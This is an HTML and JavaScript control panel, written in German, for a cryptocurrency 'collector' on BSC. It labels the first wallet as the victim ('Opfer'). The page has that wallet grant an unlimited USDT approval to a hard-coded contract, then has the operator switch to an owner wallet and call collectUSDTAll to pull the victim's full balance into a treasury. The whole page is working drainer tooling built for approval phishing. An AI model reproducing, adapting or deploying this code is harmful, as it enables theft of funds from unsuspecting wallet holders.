<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Owner Panel ‚Äì BSC Collector</title>
  <style>
    body{ font-family: 'Segoe UI', Arial, sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:380px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
    h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; }
    .step { background: #1e293b; padding: 12px; border-radius: 8px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 12px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:8px; color: white; transition: 0.2s; }
    button:hover { background: #16a34a; }
    button.secondary { background:#334155; margin-bottom: 8px; }
    button.secondary:hover { background: #475569; }
    button.danger { background: #ef4444; margin-top: 10px; }
    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 5px; border-radius: 4px; display: block; margin-top: 5px; color: #10b981; }
    #status { margin-top:15px; padding: 10px; border-radius: 6px; background: #1e293b; font-size: 13px; text-align: center; min-height: 20px; border: 1px dashed #334155; }
    .info-text { font-size: 11px; color: #94a3b8; margin-top: 10px; line-height: 1.4; }
  </style>
</head>
<body>

<div class="box">
  <h2>Admin Collector Panel</h2>

  <div class="step">
    <div class="step-title">Phase 1: Wallet A (Opfer/Quelle)</div>
    <button class="secondary" onclick="connectWalletA()">1. Wallet A verbinden</button>
    <div class="mono" id="walletAAddress">Nicht verbunden</div>
    <button style="margin-top:8px" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
  </div>

  <div class="step" style="border-left-color: #eab308;">
    <div class="step-title">Phase 2: Owner (Du)</div>
    <p class="info-text">Jetzt in Metamask zur <b>Owner-Wallet</b> wechseln!</p>
    <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
  </div>

  <div id="status">Bereit...</div>

  <div class="info-text" style="text-align:center;">
    Treasury: <span style="color: #60a5fa;">0x22Cc...95a7</span><br>
    Contract: <span style="color: #60a5fa;">0x61bF...E26B</span>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
  const COLLECTOR_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

  const collectorAbi = ["function collectUSDTAll(address from) external"];
  const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

  let walletA = null;

  function setStatus(msg) { document.getElementById("status").innerText = msg; }

  async function connectWalletA() {
    try {
      if (!window.ethereum) return alert("Bitte Metamask installieren");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      walletA = accounts[0];
      document.getElementById("walletAAddress").innerText = walletA;
      setStatus("‚úÖ Wallet A verbunden");
    } catch (e) { setStatus("‚ùå Verbindung abgelehnt"); }
  }

  async function approveUSDT() {
    try {
      if (!walletA) return setStatus("‚ùå Zuerst Schritt 1");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(USDT_ADDRESS, erc20Abi, signer);
      
      setStatus("Best√§tige Approve in Wallet A...");
      const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
      await tx.wait();
      setStatus("‚úÖ Freigabe erteilt! Jetzt Wallet wechseln.");
    } catch (e) { setStatus("‚ùå Approve fehlgeschlagen"); }
  }

  async function collectAll() {
    try {
      if (!walletA) return setStatus("‚ùå Wallet A Adresse fehlt");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const contract = new ethers.Contract(COLLECTOR_ADDRESS, collectorAbi, signer);
      setStatus("Sende Collect-Befehl...");
      
      const tx = await contract.collectUSDTAll(walletA);
      setStatus("‚åõ Transaktion l√§uft...");
      await tx.wait();
      
      setStatus("üéâ Erfolg! USDT sind in der Treasury.");
    } catch (e) {
      console.error(e);
      setStatus("‚ùå Fehler: " + (e.reason || "Bist du der Owner?"));
    }
  }
</script>
</body>
</html>
